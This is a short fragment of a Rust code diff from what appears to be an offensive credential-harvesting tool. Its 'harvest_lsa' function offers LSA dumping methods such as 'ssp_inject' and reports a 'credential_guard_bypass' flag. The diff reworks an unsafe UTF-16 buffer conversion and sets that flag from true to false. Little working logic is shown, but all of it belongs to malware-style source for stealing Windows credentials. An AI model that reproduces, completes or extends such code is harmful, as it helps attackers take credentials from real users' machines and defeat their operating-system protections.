+    let wide_slice = unsafe {
+        std::slice::from_raw_parts(uni.Buffer as *const u16, length / 2)
+    };
 
-    Some(String::from_utf16_lossy(&wide_bytes))
+    Some(String::from_utf16_lossy(wide_slice))
 }
 
 // ── Public API ─────────────────────────────────────────────────────────────
@@ -1073,7 +997,7 @@ pub fn harvest_lsa(method: &common::LsaMethod, timeout_secs: u64) -> Result<Stri
             common::LsaMethod::SspInject => "ssp_inject",
             common::LsaMethod::Auto => "auto",
         },
-        "credential_guard_bypass": true,
+        "credential_guard_bypass": false,
     });
 
     serde_json::to_string(&result).context("failed to serialize LSA harvest result")
